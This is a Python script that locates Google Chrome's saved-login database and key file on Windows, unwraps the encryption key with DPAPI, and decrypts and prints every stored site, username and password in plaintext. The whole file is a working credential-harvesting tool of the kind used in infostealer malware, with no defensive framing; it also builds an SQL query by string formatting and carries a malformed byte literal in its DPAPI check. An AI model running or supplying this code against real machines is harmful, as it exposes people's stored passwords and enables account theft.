import os
import sqlite3
import json
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import ctypes
from ctypes import wintypes

login_data_path = os.environ["USERPROFILE"]+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
local_state_path = os.environ["USERPROFILE"]+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"


class AES_GCM:
    @staticmethod
    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return cipher, ciphertext, nonce

    @staticmethod
    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    @staticmethod
    def get_cipher(key):
        cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
        return cipher


def dpapi_decrypt(encrypted):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    try:
        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blob_in = DATA_BLOB(ctypes.sizeof(p), p)
        blob_out = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        return result
    except Exception as e:
        print(f"Error in dpapi_decrypt: {e}")
        return None


def get_key_from_local_state():
    with open(local_state_path, encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def aes_decrypt(encrypted_txt):
    encoded_key = get_key_from_local_state()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi_decrypt(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = AES_GCM.get_cipher(key)
    return AES_GCM.decrypt(cipher, encrypted_txt[15:], nonce)


def chrome_decrypt(encrypted_txt):
    if encrypted_txt[:4] == b'x01x00x00x00':
        decrypted_txt = dpapi_decrypt(encrypted_txt)
        return decrypted_txt.decode()
    elif encrypted_txt[:3] == b'v10':
        decrypted_txt = aes_decrypt(encrypted_txt)
        return decrypted_txt[:-16].decode('utf-8','ignore')


def query_login_data(url):
    if url:
        sql = f"select origin_url, username_value, password_value from logins where origin_url = '{url}'"
    else:
        sql = "select origin_url, username_value, password_value from logins"
    with sqlite3.connect(login_data_path) as conn:
        result = conn.execute(sql).fetchall()
    return result


if __name__ == '__main__':
    print("Decrypt Login Data:")
    login_data = query_login_data("")
    for data in login_data:
        login = data[0], data[1], chrome_decrypt(data[2])
        print(login)
